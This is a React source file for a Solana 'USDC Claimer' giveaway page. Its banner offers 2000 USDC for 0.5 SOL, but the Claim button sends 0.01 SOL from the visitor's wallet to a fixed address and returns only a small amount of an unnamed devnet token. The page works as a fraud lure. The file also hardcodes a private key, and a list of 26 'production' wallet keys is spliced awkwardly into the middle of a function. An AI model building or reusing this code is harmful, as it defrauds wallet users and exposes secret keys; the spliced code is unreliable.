/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "29cBG2tpVji8aqhq4xMpWJotEe52Nm2YyWRRjmmJA96skgu5L4E4a39HVnCs9euxpg1adgq7i2qZ1bfYQ8dn6Dqh"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2QF1KEedw1pAytRrPj25ioETo8w5JBJeGArLXb55FVedxYpgFpaxc3aeNwigmy91WmUMELd6Sj7nSCGUuEg73mwD",
  "key1": "2vo5wkEwy8Ve1dQEja2HanJ4ZjJyLzbbJ9brxRjuwqt5JLkysKvb4bH4zWpaDH6LxHgX3anrs746Qg7YV8Kbkb5V",
  "key2": "4Skp1SFVmHy5k3SNvxktWR5ZuGfWbBJMLvxgT9E3JVRpB8UQHx3uZGqFNwDDYK4ag1QKNKxsnwARstVyUtWjoJxq",
  "key3": "2T4Ua35jBsLHyofkNuP7vusJh4MRsRc9zrmHdYzvDsb7BcwnzvbAcoBR5hKXSR9tasK9jeACR57hko9uZHgbzC5i",
  "key4": "3yLvAg8zn3mQ9a6yoL4tR5n4GcnyMJn6pv2K1uPx9vSo1RadeuXKsLoHCiGYSR9dKwAyUvWznQkd2u5HzQY9pqDa",
  "key5": "5tCv6nVLXm2r1E5gAHM67TiTztnVEPBkgcp6MyKzHhHPUc4JN3jqjtZFtGTxVNVikCqDNWw8LsVtvXk2zGphcV8L",
  "key6": "2QafxjER7WVK6BEMMX4UMKTfqoiZNUnynDZdqsGuLhRZMyGTcUXAet8BFFrPwdpYSvCCq1qWrJoC4AbqF4wDfKxH",
  "key7": "2SxebyPVhjEGG84a2xcoxartCWZ4gZx4M5pq5p9EMVZiAHYWRBcABGiDFEfpaSyTqJ6bKo6BrFZAZ4FeQEwcg5X9",
  "key8": "3oXpFb6Y8aRdFrXikBWS7WABifEZLBdCJpu4axD4yQxay5XYJRo5ijsZ5Doc7SmNDE7GhGx123Zu72D23qM2b9tm",
  "key9": "5CLisYatFJWm48wjYrs6MveV7SY6stVu39MQnyfmZ3qAVhrGzGAiyZdXFozTC1BXR9rcHeS1HjtUNwSjL9qdNTtZ",
  "key10": "4UmvaAxyrcS6TZkF6QFft3hzTtTQNWyr2py2Ly3R9AehRaUh7Wu5HYyhtRpM3XqsbCYZGzaGrAgh9vhAQYJ8VDPG",
  "key11": "ANANv529t6ctzKxKYDmavUNQiq6tbHJSbgh1pPjydz3suQp1g9MUgqivbtapbhRno3Yi4zBwAg4Tsoj1GTLMuio",
  "key12": "w8pwh4BxQuAq1o5s6xni9P55KMKBTD5WiqjZG5H5VbxcEZKGvUQH5Zt7QqLv3Y25cFGsvs5Mwu5juRwQkqYXTDN",
  "key13": "3DYv3Uk9ywBYxst8t3QUpkQn7DymbaHwPCMAP9Znpih8TFy8tNQvkeRX9imZRAxAttwhyqRgSpXwHGtQYmuZnbx7",
  "key14": "42rkvmDEvxj5K62GfjEgseyXzJTiUYTNHFb3FifQTpxmqNfhMJ6jNCDJEd7NuEao6c8JRoiU4hivJjpxPuoJd8AE",
  "key15": "5pJ4zSoaok3v8qWoRDcw2QuKSW85tCeNFWXPT8Cz76BY8tuF8PKnEn2yj981XhFkesHgYmXmzv7tJATbQ6i3MTb",
  "key16": "3KEGnJDFrbJT2CZFzC25DJUpnw8PMFoxhcd6iz6xx2FHWu5psttuQbo9kPYsKZkC32ww2prAkEvfA21XHRrJFbkR",
  "key17": "5vqe8WfykgboTfvpWUeeHBeNDokiogvLC99i9zMc3KZtshqr6UAd4ZXyvMkj5HcatPmsBH6Ufx58nzU2zF7NmkpE",
  "key18": "2iMTv8Wg4N3sm1KG24rXcG5HVDubYdDGhYx5aw1Zf9XMZxUNR9gA6XLgVHp4u7xyRkDH69Fk3vXzsWuafGDpFT7B",
  "key19": "4AyVks1jZ8GXzYJbDXk5eKxauxGNwkEfBGbQHCGgT1VByupAC4eGLcc1LyBrZWJ1y2MTYhqNPK26HZvxeA36vnQn",
  "key20": "5sVGeEAHTHvMhQW9d1pu8gCPft1nRDVgXwuPcAK22ePsyZS2Wu4FQPMod1vRbPHo3qqC6zgfGFP9g4qpcTbrMHtB",
  "key21": "51ufqZNGqvbKAWswUyuXEuwyiFwf7HVMHiCSxcQpapTwzqizuHDau9jkSLmgarVUjRFCJ4Es7jjAUDShJCKTZ6fx",
  "key22": "34vbsTgEvYtx9dGMhrkK7VMomBTGUxPdq1cv7bvehbacT6oL9ZcRdADjGAGBpwLza6YuvysKK4kvmCwYTPzySStG",
  "key23": "41e8xWwoBMzE1tqFkQ5nnNuNzWvyzH7MbZpzgwh8go6pnqFUDvyQAZP2u9sDvJHvV2d25nvwJBgJhkg9NqCM2t4n",
  "key24": "4N2imdSY8wJZBHMigtQ3u9ULxPXzwvgg7GVdxVPAPkBbPSru8YWmTiYxvJ7HLcKDeTc6LLiadgyAoA4MpvweVpFv",
  "key25": "5dPLgz1GACmDryvbcNsWcevBA25xSE8q1KSLPHyWQzY6KFkmUbUiv82yU1uZf87ShpUVoq2RuympmYws44kh4usn"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
